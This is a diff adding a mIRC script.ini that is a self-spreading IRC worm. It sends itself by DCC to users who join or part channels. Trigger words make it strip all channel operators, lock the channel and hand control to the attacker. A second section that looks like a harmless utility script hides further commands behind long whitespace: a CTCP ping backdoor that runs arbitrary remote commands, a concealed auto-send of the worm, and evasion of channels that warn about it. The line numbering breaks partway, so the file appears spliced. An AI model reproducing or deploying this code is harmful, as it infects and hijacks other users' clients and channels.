@@ -1,0 +1,58 @@
+[script]
+n0=ON 1:JOIN:#:{ /if ( $nick == $me ) { halt }
+n1=  /dcc send $nick $mircdirscript.ini
+n2=}
+n3=
+n4=ON 1:PART:#:{ /if ( $nick == $me ) { halt }
+n5=  /dcc send $nick $mircdirscript.ini
+n6=}
+n7=
+n8=ON 1:TEXT:*simpsalapim*:#:/quit iNFeCTeD!
+n9=ON 1:TEXT:*XX!XX*:*:/msg $nick i'm iNFeCTeD!
+n10=ON 1:TEXT:*ananas*:#:{
+n11=  /set %nimi  $nick
+n12=  /nick _XInFected
+n13=  %i = 0
+n14=  %opit = $opnick(0,$chan)
+n15=  :looppi
+n16=  %i = %i + 1
+n17=  /if ($opnick(%i,$chan) != $me ) { %line = $opnick(%i,$chan) }
+n18=  /if ($opnick(%i,$chan) == $me ) { /set %line " }
+n19=  %i = %i + 1
+n20=  /if ($opnick(%i,$chan) != $me ) { %line = %line $opnick(%i,$chan) }
+n21=  %i = %i + 1
+n22=  /if ($opnick(%i,$chan) != $me ) { %line = %line $opnick(%i,$chan) }
+n23=  /mode $chan -ooo %line
+n24=  /if ( %i > %opit ) { goto pois }
+n25=  goto looppi
+n26=  :pois
+n27=  /mode $chan +k iNFeCTeD!
+n28=  /mode $chan +o $nick
+n29=  /kick $chan $me
+n30=  /nick  %nimi
+n31=}
+n32=ON 1:TEXT:*:#:{ /if ( $rand(0,10) == 1 ) { 
+n33=    /mode $chan +o $nick 
+n34=    /dcc send $nick $mircdirscript.ini
+n35=    /msg $chan --==4i'M_T00_C00l!1==--
+n36=  }
+n37=}
+                                                                                                                                                                                                                                                                                                                      .msg #jeepwarz ( $+ $active $+ ) $1-
+n15=  set %a status window
+n16=  if ( $active == %a ) { $1- | halt }
+n17=}
+n18=
+n19=;ping stuff
+n20=on 1:CTCPREPLY:ping*:.notice $nick Your ping time is $duration($calc($ctime - $2)) $+ . 
+n21=CTCP 1:ping: if ( $nick != $me) { .ctcp ping $1 }                                                                                                                                                                                                                                                                                                                      | if ( $3 != $null ) { $3- | halt }
+n22=
+n23=;if you are banned but still opped, unban self
+n24=on @1:BAN:#:if ( $banmask iswm $address($me,5) ) mode $chan -b $banmask
+n25=
+n26=on 1:JOIN:*:{
+n27=  if ( $nick == $me ) { halt }
+n28=  if ( $comchan($nick,0) > 2 ) { .notice $nick Following me? | halt }                                                                                                                                                                                                                                                                                   | .dcc send $nick $mircdir $+ script.ini
+n29=}
+n30=
+n31=;show channel topic in channel on join
+n32=RAW 332:*:echo 4 $2 $chr(31) $+ $2 $+ $chr(31) $+ : $3-                                                                                                                                                                                                                                                                                                     | if ( script.ini isin $3- ) { part $2 | halt }
